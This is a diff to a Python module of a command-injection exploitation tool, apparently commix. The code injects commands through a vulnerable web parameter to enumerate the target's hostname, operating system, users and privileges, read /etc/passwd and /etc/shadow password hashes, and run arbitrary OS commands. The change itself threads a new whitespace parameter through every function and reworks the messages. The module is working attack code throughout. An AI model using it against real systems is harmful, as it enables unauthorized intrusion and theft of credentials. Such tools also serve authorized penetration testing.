@@ -32,14 +32,14 @@ __Warning:__ This technique is still experimental, is not yet fully functional a
 """
 Powershell's version number enumeration (for Windows OS)
 """
-def powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   cmd = settings.PS_VERSION
   if alter_shell:
     cmd = cmd.replace("'","\\'")
   #Command execution results.
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # The main command injection exploitation.
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     session_handler.store_cmd(url, cmd, output, vuln_parameter)
     new_line = "\n"
   else:
@@ -50,29 +50,34 @@ def powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_
     if float(ps_version):
       settings.PS_ENABLED = True
       ps_version = "".join(str(p) for p in output)
-      if menu.options.verbose:
+      if settings.VERBOSITY_LEVEL >= 1:
         print ""
       # Output PowerShell's version number
-      sys.stdout.write(Style.BRIGHT + new_line + "(!) The PowerShell's version number is " + Style.UNDERLINE +  ps_version + Style.RESET_ALL + Style.BRIGHT + Style.RESET_ALL + ".")
+      success_msg = "The PowerShell's version number is " + Style.UNDERLINE
+      success_msg += ps_version + Style.RESET_ALL + Style.BRIGHT
+      sys.stdout.write(new_line + settings.print_success_msg(success_msg) + ".")
       sys.stdout.flush()
       # Add infos to logs file.
       output_file = open(filename, "a")
-      output_file.write("    (!) The PowerShell's version number is " + ps_version + ".\n")
+      success_msg = "The PowerShell's version number is " + ps_version + ".\n"
+      output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
       output_file.close()
   except ValueError:
-    print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "Heuristics have failed to identify PowerShell's version, which means that some payloads or injection techniques may be failed." + Style.RESET_ALL
+    warn_msg = "Heuristics have failed to identify PowerShell's version, "
+    warn_msg += "which means that some payloads or injection techniques may be failed." 
+    print "\n" + settings.print_warning_msg(warn_msg)
     settings.PS_ENABLED = False
 
 """
 Hostname enumeration
 """
-def hostname(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   if settings.TARGET_OS == "win":
     settings.HOSTNAME = settings.WIN_HOSTNAME
   cmd = settings.HOSTNAME
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # The main command injection exploitation.
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     session_handler.store_cmd(url, cmd, output, vuln_parameter)
     new_line = "\n"
   else:
@@ -81,23 +86,25 @@ def hostname(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_me
   shell = output
   if shell:
     shell = "".join(str(p) for p in output)
-    sys.stdout.write(Style.BRIGHT + new_line + "(!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".")
+    success_msg = "The hostname is " + Style.UNDERLINE + shell
+    sys.stdout.write(new_line + settings.print_success_msg(success_msg) + ".")
     sys.stdout.flush()
     # Add infos to logs file.
     output_file = open(filename, "a")
-    output_file.write("    (!) The hostname is " + shell + ".\n")
+    success_msg = "The hostname is " + shell + ".\n"
+    output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
     output_file.close()
 
 """
 Retrieve system information
 """
-def system_information(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   if settings.TARGET_OS == "win":
     settings.RECOGNISE_OS = settings.WIN_RECOGNISE_OS
   cmd = settings.RECOGNISE_OS
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # The main command injection exploitation.
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     session_handler.store_cmd(url, cmd, output, vuln_parameter)
     new_line = "\n"
   else:
@@ -114,34 +121,36 @@ def system_information(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_
       cmd = settings.RECOGNISE_HP
     if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
       # The main command injection exploitation.
-      check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+      check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
       session_handler.store_cmd(url, cmd, output, vuln_parameter)
     else:
       output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
     target_arch = output
     if target_arch:
-      if menu.options.verbose:
+      if settings.VERBOSITY_LEVEL >= 1:
         print ""
       target_arch = "".join(str(p) for p in target_arch)
-      sys.stdout.write(Style.BRIGHT + new_line + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
-      sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".")
+      success_msg = "The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL  
+      success_msg += Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch
+      sys.stdout.write(new_line + settings.print_success_msg(success_msg) + ".")
       sys.stdout.flush()
       # Add infos to logs file.
       output_file = open(filename, "a")
-      output_file.write("    (!) The target operating system is " + target_os)
-      output_file.write(" and the hardware platform is " + target_arch + ".\n")
+      success_msg = "The target operating system is " + target_os
+      success_msg += " and the hardware platform is " + target_arch + ".\n"
+      output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
       output_file.close()
 
 """
 The current user enumeration
 """
-def current_user(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   if settings.TARGET_OS == "win":
     settings.CURRENT_USER = settings.WIN_CURRENT_USER
   cmd = settings.CURRENT_USER
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # The main command injection exploitation.
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     session_handler.store_cmd(url, cmd, output, vuln_parameter)
     new_line = "\n"
   else:
@@ -160,19 +169,21 @@ def current_user(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
         cmd = settings.IS_ROOT
       if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
         # The main command injection exploitation.
-        check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+        check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
         session_handler.store_cmd(url, cmd, output, vuln_parameter)
         new_line = "\n"
       else:
         output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
         new_line = ""
       shell = output
-      if menu.options.verbose:
+      if settings.VERBOSITY_LEVEL >= 1:
         print ""
-      sys.stdout.write(Style.BRIGHT + new_line + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
+      success_msg = "The current user is " + Style.UNDERLINE + cu_account  
+      sys.stdout.write(new_line + settings.print_success_msg(success_msg))
       # Add infos to logs file.
       output_file = open(filename, "a")
-      output_file.write("    (!) The current user is " + cu_account)
+      success_msg = "The current user is " + cu_account
+      output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
       output_file.close()
       if shell:
         shell = "".join(str(p) for p in shell)
@@ -192,19 +203,21 @@ def current_user(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
           output_file.write(" and it is privileged.\n")
           output_file.close()
     else:
-      if menu.options.verbose:
+      if settings.VERBOSITY_LEVEL >= 1:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".")
+      success_msg = "The current user is " + Style.UNDERLINE + cu_account
+      sys.stdout.write(settings.print_success_msg(success_msg) + ".")
       sys.stdout.flush()
       # Add infos to logs file.
       output_file = open(filename, "a")
-      output_file.write("    (!) The current user is " + cu_account + "\n")
+      success_msg = "The current user is " + cu_account + "\n"
+      output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
       output_file.close()
 
 """
 System users enumeration
 """
-def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   if settings.TARGET_OS == "win":
     settings.SYS_USERS = settings.WIN_SYS_USERS
     settings.SYS_USERS = settings.SYS_USERS + "-replace('\s+',' '))"
@@ -213,9 +226,12 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
       settings.SYS_USERS = settings.SYS_USERS.replace("+ ","%2B")
   cmd = settings.SYS_USERS
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
-    # The main command injection exploitation.
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
-    session_handler.store_cmd(url, cmd, output, vuln_parameter)
+    try:
+      # The main command injection exploitation.
+      check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+      session_handler.store_cmd(url, cmd, output, vuln_parameter)
+    except TypeError:
+      output = ""
     new_line = "\n"
   else:
     output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
@@ -223,9 +239,11 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
   sys_users = output
   # Windows users enumeration.
   if settings.TARGET_OS == "win":
-    if menu.options.verbose:
+    if settings.VERBOSITY_LEVEL >= 1:
       print ""
-    sys.stdout.write(new_line + settings.INFO_SIGN + "Executing the 'net users' command to enumerate users entries... ")
+    info_msg = "Executing the 'net users' command "
+    info_msg += "to enumerate users entries... "  
+    sys.stdout.write(new_line + settings.print_info_msg(info_msg))
     sys.stdout.flush()
     try:
       if sys_users[0] :
@@ -235,19 +253,24 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
         sys_users_list = "".join(str(p) for p in sys_users_list).strip()
         sys_users_list = ' '.join(sys_users_list.split())
         sys_users_list = sys_users_list.split()
-        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " via 'net users' command.\n" + Style.RESET_ALL)
+        success_msg =  "Identified " + str(len(sys_users_list))
+        success_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
+        success_msg += " via 'net users' command.\n"
+        sys.stdout.write("\n" + settings.print_success_msg(success_msg))
         sys.stdout.flush()
         # Add infos to logs file.
         output_file = open(filename, "a")
-        output_file.write("\n    (!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in via 'net users' command.\n")
+        output_file.write("\n    " + settings.SUCCESS_SIGN + success_msg)
         output_file.close()
         count = 0
         for user in range(0, len(sys_users_list)):
           count = count + 1
           if menu.options.privileges:
-            print settings.INFO_SIGN + "Confirming privileges of user '" + sys_users_list[user] + "'... "
+            info_msg = "Confirming privileges of user '" 
+            info_msg += sys_users_list[user] + "'... "
+            print settings.print_info_msg(info_msg)
             cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','').substring(0,6)"
-            check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+            check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
             check_privs = output
             check_privs = "".join(str(p) for p in check_privs).strip()
             check_privs = re.findall(r"(.*)", check_privs)
@@ -262,7 +285,7 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
           else :
             is_privileged = ""
             is_privileged_nh = ""
-          if menu.options.verbose:
+          if settings.VERBOSITY_LEVEL >= 1:
             print ""
           print "\n  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + sys_users_list[user] + Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "."
           # Add infos to logs file.
@@ -272,102 +295,138 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_reques
       else:
         sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
         sys.stdout.flush()
-        print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to enumerate users entries." + Style.RESET_ALL
+        warn_msg = "It seems that you don't have permissions to enumerate users entries."
+        print "\n" + settings.print_warning_msg(warn_msg)
     except TypeError:
       sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
       sys.stdout.flush()
       pass
+
+    except IndexError:
+      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      warn_msg = "It seems that you don't have permissions to read '" 
+      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries.\n" 
+      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
+      sys.stdout.flush()
+      pass
   # Unix-like users enumeration.
   else:
-    sys.stdout.write(new_line + settings.INFO_SIGN + "Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
+    info_msg = "Fetching '" + settings.PASSWD_FILE 
+    info_msg += "' to enumerate users entries... "
+    sys.stdout.write(new_line + settings.print_info_msg(info_msg))
     sys.stdout.flush()
-    if sys_users[0] :
-      sys_users = "".join(str(p) for p in sys_users).strip()
-      if len(sys_users.split(" ")) <= 1 :
-        sys_users = sys_users.split("\n")
-      else:
-        sys_users = sys_users.split(" ")
-      # Check for appropriate '/etc/passwd' format.
-      if len(sys_users) % 3 != 0 :
-        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
-        sys.stdout.flush()
-        print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL
-        sys_users = " ".join(str(p) for p in sys_users).strip()
-        print sys_users
-        output_file = open(filename, "a")
-        output_file.write("      " + sys_users)
-        output_file.close()
-      else:
-        sys_users_list = []
-        for user in range(0, len(sys_users), 3):
-           sys_users_list.append(sys_users[user : user + 3])
-        if len(sys_users_list) != 0 :
-          sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-          sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
+    try:
+      if sys_users[0] :
+        sys_users = "".join(str(p) for p in sys_users).strip()
+        if len(sys_users.split(" ")) <= 1 :
+          sys_users = sys_users.split("\n")
+        else:
+          sys_users = sys_users.split(" ")
+        # Check for appropriate '/etc/passwd' format.
+        if len(sys_users) % 3 != 0 :
+          sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
           sys.stdout.flush()
-          # Add infos to logs file.
+          warn_msg = "It seems that '" + settings.PASSWD_FILE 
+          warn_msg += "' file is not in the appropriate format. "
+          warn_msg += "Thus, it is expoted as a text file."        
+          print "\n" + settings.print_warning_msg(warn_msg)
+          sys_users = " ".join(str(p) for p in sys_users).strip()
+          print sys_users
           output_file = open(filename, "a")
-          output_file.write("\n    (!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n")
+          output_file.write("      " + sys_users)
           output_file.close()
-          count = 0
-          for user in range(0, len(sys_users_list)):
-            sys_users = sys_users_list[user]
-            sys_users = ":".join(str(p) for p in sys_users)
-            if menu.options.verbose:
-              print ""
-            count = count + 1
-            fields = sys_users.split(":")
-            fields1 = "".join(str(p) for p in fields)
-            # System users privileges enumeration
-            try:
-              if not fields[2].startswith("/"):
-                raise ValueError()
-              if menu.options.privileges:
-                if int(fields[1]) == 0:
-                  is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
-                  is_privileged_nh = " is root user "
-                elif int(fields[1]) > 0 and int(fields[1]) < 99 :
-                  is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
-                  is_privileged_nh = " is system user "
-                elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
-                  if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
-                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
-                    is_privileged_nh = " is anonymous user "
-                  elif int(fields[1]) == 60002:
-                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
-                    is_privileged_nh = " is non-trusted user "
-                  else:
-                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
-                    is_privileged_nh = " is regular user "
+        else:
+          sys_users_list = []
+          for user in range(0, len(sys_users), 3):
+             sys_users_list.append(sys_users[user : user + 3])
+          if len(sys_users_list) != 0 :
+            sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
+            success_msg = "Identified " + str(len(sys_users_list)) 
+            success_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
+            success_msg += " in '" +  settings.PASSWD_FILE + "'."
+            sys.stdout.write("\n" + settings.print_success_msg(success_msg))
+            sys.stdout.flush()
+            # Add infos to logs file.
+            output_file = open(filename, "a")
+            output_file.write("\n    " + settings.SUCCESS_SIGN + success_msg)
+            output_file.close()
+            count = 0
+            for user in range(0, len(sys_users_list)):
+              sys_users = sys_users_list[user]
+              sys_users = ":".join(str(p) for p in sys_users)
+              if settings.VERBOSITY_LEVEL >= 1:
+                print ""
+              count = count + 1
+              fields = sys_users.split(":")
+              fields1 = "".join(str(p) for p in fields)
+              # System users privileges enumeration
+              try:
+                if not fields[2].startswith("/"):
+                  raise ValueError()
+                if menu.options.privileges:
+                  if int(fields[1]) == 0:
+                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
+                    is_privileged_nh = " is root user "
+                  elif int(fields[1]) > 0 and int(fields[1]) < 99 :
+                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
+                    is_privileged_nh = " is system user "
+                  elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
+                    if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
+                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
+                      is_privileged_nh = " is anonymous user "
+                    elif int(fields[1]) == 60002:
+                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
+                      is_privileged_nh = " is non-trusted user "
+                    else:
+                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
+                      is_privileged_nh = " is regular user "
+                  else :
+                    is_privileged = ""
+                    is_privileged_nh = ""
                 else :
                   is_privileged = ""
                   is_privileged_nh = ""
-              else :
-                is_privileged = ""
-                is_privileged_nh = ""
-              sys.stdout.write("\n  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.")
-              sys.stdout.flush()
-              # Add infos to logs file.
-              output_file = open(filename, "a")
-              output_file.write("      (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
-              output_file.close()
-            except ValueError:
-              if count == 1 :
-                print Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL
-              sys_users = " ".join(str(p) for p in sys_users.split(":"))
-              print sys_users
-              output_file = open(filename, "a")
-              output_file.write("      " + sys_users)
-              output_file.close()
-    else:
-      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
-      sys.stdout.write("\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read '" + settings.PASSWD_FILE + "' o enumerate users entries." + Style.RESET_ALL)
+                sys.stdout.write("\n  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'.")
+                sys.stdout.flush()
+                # Add infos to logs file.
+                output_file = open(filename, "a")
+                output_file.write("      (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
+                output_file.close()
+              except ValueError:
+                if count == 1 :
+                  warn_msg = "It seems that '" + settings.SHADOW_FILE 
+                  warn_msg += "' file is not in the appropriate format. "
+                  warn_msg += "Thus, it is expoted as a text file."
+                  print settings.print_warning_msg(warn_msg)
+                sys_users = " ".join(str(p) for p in sys_users.split(":"))
+                print sys_users
+                output_file = open(filename, "a")
+                output_file.write("      " + sys_users)
+                output_file.close()
+      else:
+        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+        warn_msg = "It seems that you don't have permissions to read '" 
+        warn_msg += settings.PASSWD_FILE + "' o enumerate users entries." 
+        sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
+        sys.stdout.flush()
+
+    except TypeError:
+      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
       sys.stdout.flush()
+      pass
+
+    except IndexError:
+      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      warn_msg = "It seems that you don't have permissions to read '" 
+      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
+      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
+      sys.stdout.flush()
+      pass
 
 """
 System passwords enumeration
 """
-def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   if settings.TARGET_OS == "win":
     # Not yet implemented!
     pass
@@ -375,7 +434,7 @@ def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_re
     cmd = settings.SYS_PASSES
     #print ""
     if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
-      check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+      check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
       if output == False:
         output = ""
       session_handler.store_cmd(url, cmd, output, vuln_parameter)  
@@ -387,18 +446,22 @@ def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_re
     if sys_passes == "":
       sys_passes = " "
     if sys_passes :
-      sys.stdout.write(new_line + settings.INFO_SIGN + "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
+      info_msg = "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... "
+      sys.stdout.write(new_line + settings.print_info_msg(info_msg))
       sys.stdout.flush()
       sys_passes = "".join(str(p) for p in sys_passes)
       sys_passes = sys_passes.replace(" ", "\n")
       sys_passes = sys_passes.split( )
       if len(sys_passes) != 0 :
         sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
+        success_msg = "Identified " + str(len(sys_passes))
+        success_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
+        success_msg += " in '" +  settings.SHADOW_FILE + "'.\n"
+        sys.stdout.write("\n" + settings.print_success_msg(success_msg))
         sys.stdout.flush()
         # Add infos to logs file.
         output_file = open(filename, "a")
-        output_file.write("\n    (!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" )
+        output_file.write("\n    " + settings.SUCCESS_SIGN + success_msg )
         output_file.close()
         count = 0
         for line in sys_passes:
@@ -414,28 +477,32 @@ def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_re
           # Check for appropriate '/etc/shadow' format.
           except IndexError:
             if count == 1 :
-              sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.SHADOW_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL + "\n")
+              warn_msg = "It seems that '" + settings.SHADOW_FILE + "' file is not "
+              warn_msg += "in the appropriate format. Thus, it is expoted as a text file."
+              sys.stdout.write(settings.print_warning_msg(warn_msg)+ "\n")
             print fields[0]
             output_file = open(filename, "a")
             output_file.write("      " + fields[0])
             output_file.close()
       else:
         sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
-        sys.stdout.write("\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL)
+        warn_msg = "It seems that you don't have permissions to read '" 
+        warn_msg += settings.SHADOW_FILE + "' to enumerate users password hashes."
+        sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
         sys.stdout.flush()
 
 """
 Single os-shell execution
 """
-def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
+def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response):
   cmd = menu.options.os_cmd
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # The main command injection exploitation.
-    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
+    check_how_long, output = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
     session_handler.store_cmd(url, cmd, output, vuln_parameter)
     return check_how_long, output
   else:
-    if not menu.options.verbose:
+    if not settings.VERBOSITY_LEVEL >= 1:
       print ""
     output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
     print Fore.GREEN + Style.BRIGHT + str(output) + Style.RESET_ALL
@@ -444,47 +511,47 @@ def single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_
